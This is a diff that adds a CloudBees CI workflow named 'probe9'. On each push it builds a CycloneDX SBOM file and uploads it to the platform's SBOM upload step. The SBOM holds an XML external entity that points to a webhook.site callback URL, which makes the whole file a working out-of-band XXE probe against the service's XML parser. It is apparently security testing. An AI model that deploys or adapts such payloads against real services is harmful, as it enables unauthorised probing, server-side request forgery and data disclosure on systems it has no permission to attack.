@@ -1,0 +1,38 @@
+apiVersion: automation.cloudbees.io/v1alpha1
+kind: workflow
+name: probe9
+
+on:
+  push:
+    branches:
+      - "**"
+
+jobs:
+  sbom:
+    steps:
+      - name: make-sbom
+        uses: docker://alpine:3.20
+        run: |
+          cat > /cloudbees/workspace/sbom.xml <<'EOF'
+          <?xml version="1.0" encoding="UTF-8"?>
+          <!DOCTYPE bom [
+            <!ENTITY oob SYSTEM "http://webhook.site/fcf51b26-7565-4939-ae43-183e62117a14/xxe-sbom">
+          ]>
+          <bom xmlns="http://cyclonedx.org/schema/bom/1.4" version="1">
+            <components>
+              <component type="library">
+                <name>probe-&oob;</name>
+                <version>1.0.0</version>
+              </component>
+            </components>
+          </bom>
+          EOF
+          sed -i 's/^          //' /cloudbees/workspace/sbom.xml
+          cat /cloudbees/workspace/sbom.xml
+      - name: upload
+        uses: cloudbees-io/asset-chain-utils/upload-binary@main
+        with:
+          file-path: sbom.xml
+          file-type: SBOM_CYCLONEDX
+          file-name: sbom.xml
+          debug: "true"
